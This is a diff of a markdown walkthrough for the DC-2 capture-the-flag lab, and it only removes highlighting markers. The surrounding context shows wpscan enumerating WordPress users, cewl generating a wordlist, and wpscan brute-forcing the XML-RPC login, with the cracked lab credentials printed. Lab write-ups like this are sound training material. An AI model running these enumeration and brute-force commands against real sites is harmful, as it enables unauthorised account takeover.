@@ -53,7 +53,7 @@ As we can see, there is a WordPress site running on port 80.
 
 We can gather more information using the `wpscan` utility.
 
-```txt
+```
 $ wpscan --url http://dc-2 --enumerate u
 _______________________________________________________________
          __          _______   _____
@@ -131,7 +131,6 @@ Interesting Finding(s):
 
 [i] User(s) Identified:
 
-// highlight-next-line
 [+] admin
  | Found By: Rss Generator (Passive Detection)
  | Confirmed By:
@@ -148,7 +147,6 @@ Interesting Finding(s):
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 
-// highlight-next-line
 [+] tom
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
@@ -191,7 +189,7 @@ $ cewl http://dc-2/ -w passwords.txt
 
 Again, using the `wpscan` utility we can brute force the login.
 
-```txt
+```
 $ wpscan --url http://dc-2 -U user.txt -P passwords.txt
 _______________________________________________________________
          __          _______   _____
@@ -271,17 +269,13 @@ Interesting Finding(s):
 [i] No Config Backups Found.
 
 [+] Performing password attack on Xmlrpc against 3 user/s
-// highlight-start
 [SUCCESS] - jerry / adipiscing                                                                                                                                                                                                              
-[SUCCESS] - tom / parturient
-// highlight-end                                                                                                                                                                                                                
+[SUCCESS] - tom / parturient                                                                                                                                                                                                                
 Trying admin / log Time: 00:01:05 <==============================================================================================                                                                       > (646 / 1121) 57.62%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
-// highlight-start
  | Username: jerry, Password: adipiscing
  | Username: tom, Password: parturient
-// highlight-end
 
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
